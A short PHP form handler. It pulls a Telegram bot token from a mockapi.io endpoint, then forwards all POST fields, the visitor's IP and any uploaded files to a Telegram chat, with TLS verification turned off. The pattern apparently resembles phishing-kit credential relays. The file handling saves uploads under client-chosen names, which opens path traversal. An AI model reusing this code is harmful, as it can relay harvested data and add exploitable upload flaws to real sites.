<?php
$url = 'https://65538fb65449cfda0f2ee624.mockapi.io/test1/telegramAuth';
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$response = curl_exec($curl);
if(curl_errno($curl)) {
    $error_msg = curl_error($curl);
} else {
    $data = json_decode($response, true);
    if (is_array($data) && !empty($data)) {
        $first_object = $data[0];
        
    } else {
        echo "Помилка: Дані порожні або мають неправильний формат.";
    }
}
curl_close($curl);

$object = json_encode($first_object);
$decoded_object = json_decode($object, true);

// Токен телеграм бота
$tg_bot_token = $decoded_object['token'];
// ID Чата
$chat_id = $decoded_object['id'];

$text = '';

foreach ($_POST as $key => $val) {
    $text .= $key . ": " . $val . "\n";
}

$text .= "\n" . $_SERVER['REMOTE_ADDR'];
$text .= "\n" . date('d.m.y H:i:s');

$param = [
    "chat_id" => $chat_id,
    "text" => $text
];

$url = "https://api.telegram.org/bot" . $tg_bot_token . "/sendMessage?" . http_build_query($param);

var_dump($text);

file_get_contents($url);

foreach ( $_FILES as $file ) {
    $url = "https://api.telegram.org/bot" . $tg_bot_token . "/sendDocument";
    move_uploaded_file($file['tmp_name'], $file['name']);
    $document = new \CURLFile($file['name']);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ["chat_id" => $chat_id, "document" => $document]);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

    $out = curl_exec($ch);

    curl_close($ch);

    unlink($file['name']);
}
die('1');
